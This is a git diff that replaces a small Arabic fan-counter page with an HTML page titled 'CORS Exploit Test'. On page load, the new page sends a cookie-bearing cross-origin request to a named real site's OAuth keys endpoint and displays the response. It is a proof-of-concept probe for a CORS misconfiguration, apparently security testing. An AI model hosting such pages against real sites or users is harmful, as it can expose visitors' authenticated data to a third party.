@@ -1,16 +1,35 @@
 <!DOCTYPE html>
-<html lang="ar">
+<html>
 <head>
-  <meta charset="UTF-8">
-  <title>محبي أنفال ❤️</title>
-  <link rel="stylesheet" href="style.css">
+    <meta charset="utf-8">
+    <title>CORS Exploit Test</title>
 </head>
 <body>
-  <h1>😍 عدد محبي أنفال 😍</h1>
-  <div id="counter">0</div>
-  <button id="likeBtn">أحبها ❤️</button>
-  <button id="dislikeBtn">لا أحبها 💔</button>
+    <h2>Testing CORS Cookie Access</h2>
+    <pre id="output">Testing...</pre>
 
-  <script src="script.js"></script>
+<script>
+async function test() {
+    const output = document.getElementById('output');
+
+    try {
+        const res = await fetch("https://smarttrader.deriv.com/oauth2/v1/keys", {
+            method: "GET",
+            credentials: "include",
+        });
+
+        const text = await res.text();
+
+        output.textContent = 
+            "Status: " + res.status + "\n\n" +
+            "Response (first 500 chars):\n" + text.substring(0, 500);
+    }
+    catch (e) {
+        output.textContent = "Error: " + e;
+    }
+}
+
+test();
+</script>
 </body>
 </html>
